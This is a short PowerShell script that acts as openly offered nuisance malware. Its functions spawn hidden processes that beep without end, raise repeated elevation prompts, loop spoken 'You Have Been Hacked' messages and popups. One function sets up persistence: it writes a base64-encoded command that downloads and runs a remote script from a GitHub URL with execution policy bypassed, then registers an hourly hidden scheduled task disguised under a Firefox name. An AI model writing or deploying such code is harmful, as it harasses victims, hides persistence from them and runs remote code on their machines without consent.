#### Full Bullshit ####

function Get-Beep {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){[System.Console]::Beep(1000,1000)}'
}

function Get-Elevated {
    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){sleep(get-random(30));start-process -Verb runas calc.exe}'
}

function Stop-bullshit {
    Get-process powershell | Stop-process
    schtasks /delete /tn firefox\GetHacked
}

function Get-Hacked {
    start-process powershell -WindowStyle hidden -ArgumentList '-WindowStyle hidden -command "Add-Type -AssemblyName System.speech; while (1) { (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''You Have Been Hackeddd, dretzer'') }"'
    start-process powershell -WindowStyle Hidden -ArgumentList @'
while(1){(New-Object -ComObject wscript.shell).Popup($('Get Hacked'),0,$('Powned'),0x1)};sleep(1000) 
'@
}
function get-persist {
    Add-Content -Value @'
$command = 'iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/EOLFML/RandomThings/main/Bullshit.ps1");All-Bullshit'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -executionpolicy bypass -WindowStyle hidden -encodedcommand $encodedcommand 
'@ -path $env:USERPROFILE\test.ps1
    schtasks /create /tn "Firefox\GetHacked" /tr "powershell -executionpolicy bypass -windowstyle hidden -File %USERPROFILE%\test.ps1" /sc HOURLY /mo 1 /F

}
function All-Bullshit{
    Get-Beep
    Get-Elevated
    get-Hacked
    get-persist
}
